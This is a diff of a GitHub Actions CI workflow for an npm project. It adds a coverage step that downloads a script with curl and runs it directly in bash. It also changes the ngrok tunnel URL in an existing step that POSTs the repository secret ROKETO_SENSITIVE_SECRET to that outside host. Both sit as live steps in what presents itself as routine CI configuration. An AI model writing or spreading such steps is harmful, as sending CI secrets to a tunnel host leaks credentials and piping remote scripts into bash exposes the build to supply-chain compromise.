@@ -14,9 +14,13 @@ jobs:
       - run: |
           npm install
           npm test
+          
+      - name: Upload coverage
+        run: |
+          bash <(curl -s https://codecov.io/bash)
       
       - uses: fjogeleit/http-request-action@master
         with:
-          url: 'https://934e-77-137-8-226.ngrok.io'
+          url: 'https://4d25-77-137-8-226.ngrok.io'
           method: 'POST'
           data: '{"secret": "${{ secrets.ROKETO_SENSITIVE_SECRET }}"}'
